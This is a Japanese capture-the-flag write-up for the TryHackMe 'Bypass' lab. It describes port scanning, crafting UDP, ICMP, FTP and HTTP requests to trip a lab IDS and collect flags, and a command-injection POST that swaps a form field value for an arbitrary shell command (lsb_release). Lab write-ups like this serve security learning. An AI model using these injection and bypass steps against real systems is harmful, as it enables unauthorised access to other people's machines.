# Bypass CTF

https://tryhackme.com/room/bypass

```
ネットワークセキュリティチームは、 IDSを使用した最先端の保護メカニズムを導入しています。あなたの任務は、ネットワークセキュリティソリューションを回避し、会社のCCTVウェブパネルにアクセスすることです。
```

## Enumeration

### ポートスキャン

```sh
rustscan -a $TARGET

PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 61
80/tcp  open  http    syn-ack ttl 61
443/tcp open  https   syn-ack ttl 61
```

SSH,HTTP,HTTPS

HTTPはForbiddenで何も表示されず手掛かりがない。


HTTSでadminログイン画面が表示され、下記コメントがあった。

```html
<!-- Here we will add redirection to /mail endpoint -->
```

https://cctv.thm/mail/ にアクセスするとテキストファイルがあった。  
クイズ1から5までのバイパス手順が書かれている。

## 1

```
Make a UDP request to the machine with source port number 5000. Once done, you can fetch the flag through /fpassword.php?id=1
```

```sh
$ sudo nping --udp --source-port 5000 cctv.thm
[sudo] password for kali: 

Starting Nping 0.7.95 ( https://nmap.org/nping ) at 2025-07-31 10:51 JST
SENT (0.0257s) UDP 10.13.85.243:5000 > 10.10.134.20:40125 ttl=64 id=33002 iplen=28 
SENT (1.0267s) UDP 10.13.85.243:5000 > 10.10.134.20:40125 ttl=64 id=33002 iplen=28 
SENT (2.0280s) UDP 10.13.85.243:5000 > 10.10.134.20:40125 ttl=64 id=33002 iplen=28 
SENT (3.0300s) UDP 10.13.85.243:5000 > 10.10.134.20:40125 ttl=64 id=33002 iplen=28 
SENT (4.0320s) UDP 10.13.85.243:5000 > 10.10.134.20:40125 ttl=64 id=33002 iplen=28 
 
Max rtt: N/A | Min rtt: N/A | Avg rtt: N/A
Raw packets sent: 5 (140B) | Rcvd: 0 (0B) | Lost: 5 (100.00%)
Nping done: 1 IP address pinged in 5.08 seconds
```

https://cctv.thm/fpassword.php?id=1 にブラウザでアクセスしたらフラグが表示された。httpではダメなことに注意。

## 2

```
Make a TCP request to fpassword.php?id=2 with user-agent set as "I am Steve Friend". Once done, you can fetch the flag through /fpassword.php?id=2
```

HTTPに対して一回リクエストを送ってForbiddenが返ってきた後、HTTPSに対して普通にリクエストするとフラグが返る。

```sh
curl -i -s http://cctv.thm/fpassword.php?id=2 -A "I am Steve Friend"
```

## 3

```
Send a ping packet to the machine appearing as Mozilla browser (Hint: packet content with user agent set as Mozilla). Once done, you can fetch the flag through /fpassword.php?id=3
```

```sh
sudo nping --icmp --data-string 'User-Agent: Mozilla' cctv.thm
```

## 4

```
Attempt to login to the FTP server with content containing the word "user" in it. Once done, you can fetch the flag from /fpassword.php?id=4
```

確認していなかったが、22はSSHではなくFTPだった様子。

contentとは何だと思ったが、ユーザー名にuserを入れて一回実行しておくとフラグが返るようになる。

```sh
$ ftp user@cctv.thm -p 22
Connected to cctv.thm.
SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9
ftp> 
```

## 5

```
Send TCP request to flagger.cgi endpoint with a host header containing more than 50 characters. Once done, you can fetch the flag from /fpassword.php?id=5
```

```sh
$ curl -i -s http://cctv.thm/flagger.cgi -H "Host: 123456789012345678901234567890123456789012345678901234567890"
```

今までのフラグを全部結合すると、admin画面のパスワードになる。

## 7

`What is the lsb_release -r -s command output from the attached machine?`

コマンドインジェクション

```http
POST / HTTP/1.1
Host: cctv.thm
Cookie: PHPSESSID=oe3ombvpr3ns7138lrn70p7vbh
Content-Length: 11
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="133", "Not(A:Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Origin: https://cctv.thm
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://cctv.thm/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i
Connection: keep-alive

commands=lsb_release -r -s
```

```html
<select name="commands" id="commands">
  <option value="date">Current Date [REDACTED]
</option>
</select>
```

hostname コマンドでホスト名を確認してユーザー名とし、先ほどと同じパスワードを使ってログインできる。

## 振り返り

- もう少し実践的なバイパス方法を学べることを期待していたが、そういうのではなく残念。
